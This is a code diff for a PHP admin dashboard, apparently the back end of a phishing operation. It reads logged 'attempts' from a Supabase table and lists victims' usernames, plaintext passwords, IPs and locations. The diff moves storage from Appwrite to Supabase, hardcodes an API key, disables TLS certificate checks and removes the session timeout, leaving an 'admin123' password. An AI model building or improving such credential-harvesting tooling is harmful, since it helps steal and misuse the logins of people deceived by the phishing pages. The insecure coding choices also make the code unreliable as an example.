@@ -1,13 +1,10 @@
 <?php
 // ============================================
-// DASHBOARD - Read logs from Appwrite Database
+// DASHBOARD - Read logs from Supabase
 // ============================================
 
 session_start();
 
-// ============================================
-// PASSWORD PROTECTION
-// ============================================
 $admin_password = 'admin123';  // ← CHANGE THIS!
 
 $is_logged_in = false;
@@ -15,7 +12,6 @@ $is_logged_in = false;
 if (isset($_POST['login_password'])) {
     if ($_POST['login_password'] === $admin_password) {
         $_SESSION['admin_logged_in'] = true;
-        $_SESSION['admin_login_time'] = time();
         header('Location: dashboard.php');
         exit;
     } else {
@@ -24,11 +20,6 @@ if (isset($_POST['login_password'])) {
 }
 
 if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true) {
-    if (time() - $_SESSION['admin_login_time'] > 3600) {
-        session_destroy();
-        header('Location: dashboard.php');
-        exit;
-    }
     $is_logged_in = true;
 }
 
@@ -39,47 +30,33 @@ if (isset($_GET['logout'])) {
 }
 
 // ============================================
-// APPRWRITE CONFIGURATION
+// YOUR SUPABASE CREDENTIALS
 // ============================================
-
-$endpoint = getenv('APPWRITE_ENDPOINT') ?: 'https://cloud.appwrite.io/v1';
-$projectId = getenv('APPWRITE_PROJECT_ID');
-$apiKey = getenv('APPWRITE_API_KEY');
-$databaseId = getenv('APPWRITE_DATABASE_ID');
-$collectionId = getenv('APPWRITE_COLLECTION_ID');
+$supabaseUrl = 'https://eqqdjscfogwwshzdrdnw.supabase.co';
+$supabaseKey = 'sb_publishable_7rVfq5jdsbhvXikHvXfNbA_x5ZxRisl';
+// ============================================
 
 $entries = [];
 $total = 0;
-$unique_ips = 0;
-$unique_users = 0;
 
-// ============================================
-// FETCH LOGS FROM APPRWRITE
-// ============================================
+if ($is_logged_in) {
+    $url = $supabaseUrl . '/rest/v1/logs?order=created_at.desc&limit=100';
 
-if ($is_logged_in && $projectId && $apiKey && $databaseId && $collectionId) {
-    $url = "$endpoint/databases/$databaseId/collections/$collectionId/documents";
-    
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_HTTPHEADER, [
-        'Content-Type: application/json',
-        'X-Appwrite-Project: ' . $projectId,
-        'X-Appwrite-Key: ' . $apiKey
+        'apikey: ' . $supabaseKey,
+        'Authorization: Bearer ' . $supabaseKey
     ]);
-    $response = curl_exec($ch);
-    $error = curl_error($ch);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+
+    $result = curl_exec($ch);
     curl_close($ch);
-    
-    if ($response) {
-        $data = json_decode($response, true);
-        if (isset($data['documents'])) {
-            $entries = array_reverse($data['documents']);
-            $total = count($entries);
-            $unique_ips = count(array_unique(array_column($entries, 'ip')));
-            $unique_users = count(array_unique(array_column($entries, 'username')));
-        }
+
+    if ($result) {
+        $entries = json_decode($result, true) ?? [];
+        $total = count($entries);
     }
 }
 
@@ -271,8 +248,6 @@ if (!$is_logged_in) {
 
         <div class="stats">
             <div class="stat-card"><div class="number"><?php echo $total; ?></div><div class="label">Total Attempts</div></div>
-            <div class="stat-card"><div class="number"><?php echo $unique_ips; ?></div><div class="label">Unique IPs</div></div>
-            <div class="stat-card"><div class="number"><?php echo $unique_users; ?></div><div class="label">Unique Users</div></div>
         </div>
 
         <div class="table-wrapper">
@@ -282,7 +257,7 @@ if (!$is_logged_in) {
                         <th>#</th>
                         <th>Username</th>
                         <th>Password</th>
-                        <th>IP Address</th>
+                        <th>IP</th>
                         <th>Location</th>
                         <th>Time</th>
                     </tr>
@@ -308,21 +283,14 @@ if (!$is_logged_in) {
                             } else {
                                 $location = 'Unknown';
                             }
-                            
-                            $flag = '🌍';
-                            $country = strtolower($entry['country'] ?? '');
-                            if (strpos($country, 'nigeria') !== false) $flag = '🇳🇬';
-                            elseif (strpos($country, 'canada') !== false) $flag = '🇨🇦';
-                            elseif (strpos($country, 'usa') !== false || strpos($country, 'united states') !== false) $flag = '🇺🇸';
-                            elseif (strpos($country, 'uk') !== false || strpos($country, 'united kingdom') !== false) $flag = '🇬🇧';
                         ?>
                         <tr>
                             <td><?php echo $count; ?></td>
                             <td class="username-cell"><?php echo htmlspecialchars($entry['username'] ?? '-'); ?></td>
                             <td class="password-cell"><?php echo htmlspecialchars($entry['password'] ?? '-'); ?></td>
                             <td class="ip-cell"><?php echo htmlspecialchars($entry['ip'] ?? '-'); ?></td>
-                            <td><?php echo $flag . ' ' . htmlspecialchars($location); ?></td>
-                            <td class="time-cell"><?php echo htmlspecialchars($entry['timestamp'] ?? '-'); ?></td>
+                            <td><?php echo htmlspecialchars($location); ?></td>
+                            <td class="time-cell"><?php echo htmlspecialchars($entry['created_at'] ?? '-'); ?></td>
                         </tr>
                         <?php endforeach; ?>
                     <?php endif; ?>
@@ -331,7 +299,7 @@ if (!$is_logged_in) {
         </div>
 
         <div class="footer">
-            <p>📁 Logs stored in Appwrite | Total entries: <?php echo $total; ?></p>
+            <p>📁 Logs stored in Supabase | Total entries: <?php echo $total; ?></p>
         </div>
     </div>
 
